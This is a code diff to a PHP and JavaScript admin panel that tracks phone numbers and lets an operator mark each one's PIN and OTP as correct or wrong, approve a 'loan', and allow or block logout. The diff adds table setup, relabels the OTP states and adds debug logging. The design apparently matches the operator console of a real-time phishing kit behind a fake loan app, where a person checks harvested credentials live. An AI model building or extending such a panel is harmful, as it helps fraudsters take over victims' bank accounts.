@@ -11,6 +11,16 @@ function getDbConnection($h,$p,$d,$u,$pw){ static $c=null; if(!$c){ $c=@pg_conne
 $conn = getDbConnection($dbHost,$dbPort,$dbName,$dbUser,$dbPass);
 if(!$conn) die("DB error");
 
+// Ensure all required columns exist
+pg_query($conn, "CREATE TABLE IF NOT EXISTS users (
+    phone VARCHAR(20) PRIMARY KEY,
+    pin INTEGER DEFAULT 0,
+    otp INTEGER DEFAULT 0,
+    approve INTEGER DEFAULT 0,
+    logout INTEGER DEFAULT 0,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+)");
+
 // Add `created_at` column if missing (to track insertion order)
 $checkCol = pg_query($conn, "SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name='created_at'");
 if(!$checkCol || pg_num_rows($checkCol)==0){
@@ -24,6 +34,12 @@ pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS approve INTEGER DEFA
 // Ensure `logout` column exists (default 0, but values: 0=default, 1=Yes/Allow, 2=No/Block)
 pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS logout INTEGER DEFAULT 0");
 
+// Ensure `pin` column exists
+pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS pin INTEGER DEFAULT 0");
+
+// Ensure `otp` column exists
+pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS otp INTEGER DEFAULT 0");
+
 // Handle AJAX updates
 if($_SERVER['REQUEST_METHOD']=='POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
     && strtolower($_SERVER['HTTP_X_REQUESTED_WITH'])=='xmlhttprequest'){
@@ -33,15 +49,21 @@ if($_SERVER['REQUEST_METHOD']=='POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']
         echo json_encode(['success'=>false,'error'=>'Invalid params']); exit;
     }
     switch($type){
-        case 'pin': $col='pin'; $val=($action=='correct')?1:0; break;
+        case 'pin': 
+            $col='pin'; 
+            $val=($action=='correct')?1:0; 
+            break;
         case 'otp': 
             $col='otp'; 
-            // OTP: off (clicked off) -> set to 1, on (clicked on) -> set to 2
-            if($action=='off') $val=1;
-            elseif($action=='on') $val=2;
+            // OTP: off (clicked off/wrong) -> set to 1, on (clicked on/correct) -> set to 2
+            if($action=='off' || $action=='wrong') $val=1;
+            elseif($action=='on' || $action=='correct') $val=2;
             else $val=0;
             break;
-        case 'loan': $col='approve'; $val=($action=='approve')?1:0; break;
+        case 'loan': 
+            $col='approve'; 
+            $val=($action=='approve')?1:0; 
+            break;
         case 'logout': 
             $col='logout'; 
             // Map actions to values: allow=1 (Yes), block=2 (No)
@@ -51,7 +73,20 @@ if($_SERVER['REQUEST_METHOD']=='POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']
             break;
         default: echo json_encode(['success'=>false]); exit;
     }
+    
+    // Debug log
+    error_log("Updating $col for phone $phone to value $val");
+    
     $r=pg_query_params($conn,"UPDATE users SET $col=$1 WHERE phone=$2",[$val,$phone]);
+    
+    if($r) {
+        // Fetch the updated value to confirm
+        $check = pg_query_params($conn, "SELECT $col FROM users WHERE phone=$1", [$phone]);
+        if($check && $row = pg_fetch_assoc($check)) {
+            error_log("Confirmed $col is now: " . $row[$col]);
+        }
+    }
+    
     echo json_encode(['success'=>(bool)$r]);
     exit;
 }
@@ -115,8 +150,8 @@ $totalRecords = count($records);
         .badge-logout-yes{background-color:#d4edda;color:#155724;}
         .badge-logout-no{background-color:#f8d7da;color:#721c24;}
         /* New OTP badge styles for values 1 and 2 */
-        .badge-otp-off{background-color:#f8d7da;color:#721c24;}  /* Red-ish for OFF (1) */
-        .badge-otp-on{background-color:#d4edda;color:#155724;}   /* Green for ON (2) */
+        .badge-otp-off{background-color:#f8d7da;color:#721c24;}  /* Red-ish for OFF/WRONG (1) */
+        .badge-otp-on{background-color:#d4edda;color:#155724;}   /* Green for ON/CORRECT (2) */
         .btn-group{display:flex;flex-wrap:wrap;gap:8px;}
         .btn{border:none;padding:6px 14px;border-radius:8px;font-size:0.75rem;font-weight:500;cursor:pointer;white-space:nowrap;}
         .btn-pin{background-color:#1d4ed8;color:#fff;}
@@ -154,7 +189,7 @@ $totalRecords = count($records);
             </tbody>
         </table>
     </div>
-    <footer>✅ Newest shown first (top). # numbers: newest = highest number.<br>📌 Logout values: 1 = Yes (Logged In / Allow), 2 = No (Logged Out / Block), 0 = Default<br>📌 OTP values: 1 = OFF, 2 = ON</footer>
+    <footer>✅ Newest shown first (top). # numbers: newest = highest number.<br>📌 OTP values: 0=Default/Pending, 1=WRONG/OFF, 2=CORRECT/ON<br>📌 Logout values: 1 = Yes (Logged In), 2 = No (Logged Out), 0 = Default</footer>
 </div>
 <div id="verifyModal" class="modal"><div class="modal-content"><p id="modalMessage"></p><div class="modal-buttons" id="modalButtons"></div></div></div>
 <script>
@@ -173,7 +208,7 @@ function renderTable(records){
         const rowNumber = totalRows - idx;
         const phone=escapeHtml(rec.phone);
         const pinStatus=rec.pin_status;
-        const otpStatus=rec.otp_status; // Values: 1 = OFF, 2 = ON, 0 = default
+        const otpStatus=rec.otp_status; // Values: 0=Default/Pending, 1=WRONG/OFF, 2=CORRECT/ON
         const loanApprove=rec.loan_approve;
         const logoutStatus=rec.logout_status;
         
@@ -191,17 +226,20 @@ function renderTable(records){
             logoutClass = 'badge-warning';
         }
 
-        // Format OTP display: 1 = OFF, 2 = ON
+        // Format OTP display: 0 = Pending, 1 = WRONG/OFF, 2 = CORRECT/ON
         let otpDisplay = '';
         let otpClass = '';
-        if(otpStatus === 1){
-            otpDisplay = 'OFF (1)';
+        if(otpStatus === 0){
+            otpDisplay = 'Pending (0)';
+            otpClass = 'badge-warning';
+        } else if(otpStatus === 1){
+            otpDisplay = 'WRONG/OFF (1)';
             otpClass = 'badge-otp-off';
         } else if(otpStatus === 2){
-            otpDisplay = 'ON (2)';
+            otpDisplay = 'CORRECT/ON (2)';
             otpClass = 'badge-otp-on';
         } else {
-            otpDisplay = 'Default (0)';
+            otpDisplay = 'Unknown';
             otpClass = 'badge-warning';
         }
         
@@ -226,19 +264,19 @@ function renderTable(records){
 function escapeHtml(str){ return str.replace(/[&<>]/g,m=>m=='&'?'&amp;':m=='<'?'&lt;':m=='>'?'&gt;':m); }
 
 function attachEvents(){
-    document.querySelectorAll('.verify-pin').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'pin',[{label:'✅ CORRECT',action:'correct',class:'btn-correct'},{label:'❌ WRONG',action:'wrong',class:'btn-wrong'}]); });
-    // Updated OTP modal: Off -> sets to 1, On -> sets to 2
+    document.querySelectorAll('.verify-pin').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'pin',[{label:'✅ CORRECT PIN',action:'correct',class:'btn-correct'},{label:'❌ WRONG PIN',action:'wrong',class:'btn-wrong'}]); });
+    // Updated OTP modal: Off/Wrong -> sets to 1, On/Correct -> sets to 2
     document.querySelectorAll('.verify-otp').forEach(btn=>{ 
         btn.onclick=()=>showModal(btn.dataset.phone,'otp',[
-            {label:'❌ WRONG OTP',action:'off',class:'btn-otp-off'}, 
-            {label:'✅ CORRECT OTP',action:'on',class:'btn-otp-on'}
+            {label:'❌ WRONG OTP (Set to 1)',action:'wrong',class:'btn-otp-off'}, 
+            {label:'✅ CORRECT OTP (Set to 2)',action:'correct',class:'btn-otp-on'}
         ]); 
     });
     document.querySelectorAll('.verify-loan').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'loan',[{label:'✅ Approve (1)',action:'approve',class:'btn-approve'},{label:'❌ Default (0)',action:'default',class:'btn-default'}]); });
     document.querySelectorAll('.verify-logout').forEach(btn=>{ 
         btn.onclick=()=>showModal(btn.dataset.phone,'logout',[
-            {label:'✅ Yes Logged In',action:'allow',class:'btn-allow'}, 
-            {label:'❌ No Logged Out',action:'block',class:'btn-block'}
+            {label:'✅ Yes - Logged In (Set to 1)',action:'allow',class:'btn-allow'}, 
+            {label:'❌ No - Logged Out (Set to 2)',action:'block',class:'btn-block'}
         ]); 
     });
 }
